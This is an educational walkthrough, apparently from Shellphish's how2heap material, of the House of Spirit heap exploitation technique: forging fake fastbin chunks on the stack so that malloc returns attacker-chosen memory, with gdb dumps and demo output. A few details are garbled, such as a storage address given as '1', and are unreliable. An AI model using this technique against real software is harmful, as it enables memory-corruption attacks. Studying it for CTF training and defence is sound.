# Shellphish how2heap House of Spirit

This is another section of the CTF team Shellphish's how2heap educational github repo. This time, we are focusing on the House of Spirit attack.

For a look at a ctf challenge which uses this technique: https://github.com/guyinatuxedo/ctf/tree/master/hack.lu14/pwn/oreo

The goal of this is to get malloc to return a pointer to a that we control (it can be in the heap, stack, or anywhere that we can write to). It will require us to make two fake chunks, by writing two eight byte integers. After that we just need to overwrite a ptr to the first fake chunk, and free it.

## Exploit Process

First we will need to call malloc once, so that it sets up it's memory.

Proceeding that we will start setting up our fake chunk. Right now it just looks like this`):

```
gdb-peda$ x/12g 0x7fffffffddd0
0x7fffffffddd0:	0x00000000000000c2	0x00007fffffffde0f
0x7fffffffdde0:	0x00007fffffffde0e	0x00007ffff7abab85
0x7fffffffddf0:	0x0000000000000001	0x0000555555554a5d
0x7fffffffde00:	0x0000000000000000	0x0000000000000000
0x7fffffffde10:	0x0000555555554a10	0x00005555555546d0
0x7fffffffde20:	0x00007fffffffdf10	0x04254386eda99100
```

This chunk of memory will end up splitting into two fake chunks. The first starts at `0x7fffffffddd0` and the second starts at `0x7fffffffde10` (by start I mean where the metadata for the fake chunk starts).

Next we will have to edit the size for our first fake chunk (will be stored at `0x7fffffffddd8`). One thing about it, the size has to be 16 bytes more than the total region, to account for the 16 bytes of chunk metadata. If we input the size to be `0x40`, that will fit perfectly since `0x7fffffffde10 - 0x7fffffffddd0 = 0x40` (this also still falls into the fastbin category which for x64 enviornments is equal to or under 128 bytes). In addition to that, another we also need to look out for the `IS_MAPPED` (second least signifcant bit, right after `previous_chunk_in_use`) and `NON_MAIN_ARENA` (third least signifcant bit, right after `IS_MAPPED`) bits are switched to 0x0 they will pass the check in free. In addition to this, the size we put will need to be equivalent to size that we malloc to get the fake pointer, after it has been rounded to the internal size (on x64 environments 0x30-0x38 will round up to 0x40)  So now our chunk looks like this:

```
gdb-peda$ x/12g 0x7fffffffddd0
0x7fffffffddd0:	0x00000000000000c2	0x0000000000000040
0x7fffffffdde0:	0x00007fffffffde0e	0x00007ffff7abab85
0x7fffffffddf0:	0x0000000000000001	0x0000555555554a5d
0x7fffffffde00:	0x0000000000000000	0x0000000000000000
0x7fffffffde10:	0x0000555555554a10	0x00005555555546d0
0x7fffffffde20:	0x00007fffffffdf10	0x04254386eda99100
```

Next we will need to write the size of the second fake chunk. This value will be stored at `1`. The value that we put here doesn't matter too much. In the section it used `0x1234`, however I got it to work with values ranging from `0x11` to `0x1200`. However we do need this value in order for this to work, and the range of values you can have which will pass all of the checks as you can see is quite large (it has to be less than `av->system_mem` which is `0x1d4c0` or 128 kb on x64 enviornments and greater than 2*SIZE_SZ which is `0x10` on 64 bit systems). With that our fake chunk looks like this:

```
gdb-peda$ x/12g 0x7fffffffddd0
0x7fffffffddd0:	0x00000000000000c2	0x0000000000000040
0x7fffffffdde0:	0x00007fffffffde0e	0x00007ffff7abab85
0x7fffffffddf0:	0x0000000000000001	0x0000555555554a5d
0x7fffffffde00:	0x0000000000000000	0x0000000000000000
0x7fffffffde10:	0x0000555555554a10	0x0000000000001234
0x7fffffffde20:	0x00007fffffffdf10	0x04254386eda99100
```

Now we can just overwrite a pointer to point to chunk `0x7fffffffdde0` (it will point to the content section of the fake chunk, which is supposed to be after the 16 bytes of chunk metadata). We can see it here that we have overwritten a pointer on the stack with that address:

```
gdb-peda$ find 0x7fffffffdde0
Searching for '0x7fffffffdde0' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0x7fffffffddc8 --> 0x7fffffffdde0 --> 0x7fffffffde0e --> 0x555555554a100000 
``` 

Proceeding that, we can free the pointer which we have overwritten. GDB tells us that the argument for free is indeed the pointer to our first fake chunk:

```
Guessed arguments:
arg[0]: 0x7fffffffdde0 --> 0x7fffffffde0e --> 0x555555554a100000 
```

After the call to free, we can see that our chunk has been addres to the fastbin list (it is the address we freed minus `0x10` because of the 16 bytes of heap metadata)

```
gdb-peda$ p main_arena.fastbinsY
$1 = {0x0, 0x0, 0x7fffffffddd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```
After that, the fake chunk has been freed it has been added to the fast bin list. You should just be able to allocate another chunk using `malloc` of a similar size, and you will get the chunk allocated (which we can see is what we got):

```
Now the next malloc will return the region of our fake chunk at 0x7fffffffddd8, which will be 0x7fffffffdde0!
malloc(0x30): 0x7fffffffdde0
```


## Section Running

Below you can see the actual elf for this section running:

```
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7fffffffddd8 and the second at 0x7fffffffde08.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffddd8.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7fffffffddd8, which will be 0x7fffffffdde0!
malloc(0x30): 0x7fffffffdde0
```
